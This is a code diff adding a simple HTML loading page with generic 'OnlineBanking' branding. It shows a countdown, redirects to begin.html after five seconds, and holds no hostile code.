@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width" />
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+
+    <header class="logo">
+        <img src="assets/header.jpeg" alt="">
+    </header>
+
+    <br>
+
+    <div class="login-heading">
+        <h3 class="text-center">Loading Please Wait</h3>
+    </div>
+
+    <div class="loader-container">
+        <img src="assets/loading.gif" width="50%" />
+        <h1 class="text-center" style="font-size: 14px; color: grey; font-family: Heebo, sans-serif;">Please wait...<br>Redirecting in <span id="seconds">5</span> seconds.</h1>
+    </div>
+
+    <div class="footer">
+        <p>© OnlineBanking</p>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script>
+        window.onload = function () {
+            let timeout = 5000;
+            if (window.location.hostname == 'localhost' || window.location.hostname == '127.0.0.1') {
+                timeout = 5000;
+            }
+            var url = window.location.href;
+            var urlObject = new URL(url);
+            var nextValue = urlObject.searchParams.get('next');
+            setTimeout(function () {
+                window.location.href = "begin.html";
+            }, timeout);
+        }
+        $(document).ready(function () {
+            var seconds = 5;
+            var countdown = setInterval(function () {
+                seconds--;
+                $('#seconds').text(seconds);
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    console.log('Countdown reached 0');
+                }
+            }, 1000);
+            localStorage.setItem('1', 0);
+
+        });
+    </script>
+</body>
+
+</html>
